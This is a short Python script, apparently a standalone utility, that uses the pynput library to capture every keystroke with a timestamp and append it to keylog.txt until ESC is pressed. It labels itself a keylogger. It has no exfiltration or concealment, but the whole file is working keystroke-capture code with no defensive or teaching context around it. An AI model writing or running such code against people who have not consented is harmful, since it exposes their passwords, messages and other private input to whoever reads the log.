from pynput import keyboard
from datetime import datetime
import os

# Define the file where logs will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        # Format the output with time and key
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"[{current_time}] {key.char}\n")
    except AttributeError:
        # Handle special keys (space, enter, etc.)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"[{current_time}] {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when ESC is pressed
        print("Keylogger stopped.")
        return False

# Start the listener in a background thread
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



